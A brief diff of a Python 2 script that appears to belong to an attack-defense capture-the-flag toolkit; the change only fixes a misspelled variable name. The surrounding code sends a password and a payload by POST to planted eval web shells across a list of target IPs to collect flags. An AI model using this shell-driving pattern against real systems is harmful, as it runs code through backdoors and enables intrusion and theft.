@@ -60,12 +60,12 @@ def get_flag():
     #target = open('auxi/flags.txt','w')
     for i in ipList:
         for j in POST_eval_shells_path_pwd:
-            evel_POST_data={}
-            evel_POST_data['pass']='Sn3rtf4ck'
-            evel_POST_data[POST_eval_shells_path_pwd[j]] =eval_file
+            eval_POST_data={}
+            eval_POST_data['pass']='Sn3rtf4ck'
+            eval_POST_data[POST_eval_shells_path_pwd[j]] =eval_file
             url = "http://" + i + j
             try:
-                flag = requests.post(url,data = evel_POST_data,timeout=3)
+                flag = requests.post(url,data = eval_POST_data,timeout=3)
                 judege(url,flag)
             except:
                 print "error!"
